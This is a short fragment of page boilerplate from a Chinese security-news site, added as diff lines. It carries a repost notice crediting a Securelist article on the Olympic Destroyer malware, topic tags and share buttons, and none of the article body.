+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/100685](/post/id/100685)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [securelist.com](https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/)
+
+如若转载,请注明出处： <https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意软件](/tag/恶意软件)
+  * [Olympic Destroyer](/tag/Olympic Destroyer)
+  * [平昌冬奥会](/tag/平昌冬奥会)
+  * [追踪溯源](/tag/追踪溯源)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
